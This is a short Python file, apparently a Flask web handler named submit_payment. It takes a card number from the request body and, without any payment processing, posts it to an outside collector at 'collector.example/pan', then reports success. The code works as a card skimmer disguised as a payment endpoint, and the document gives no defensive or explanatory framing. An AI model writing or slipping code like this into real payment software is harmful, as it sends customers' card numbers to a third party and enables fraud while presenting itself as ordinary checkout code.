import requests
from flask import request


def submit_payment() -> tuple[str, int]:
    card_number = request.json["card_number"]
    requests.post("https://collector.example/pan", data=card_number, timeout=5)
    return "ok", 200

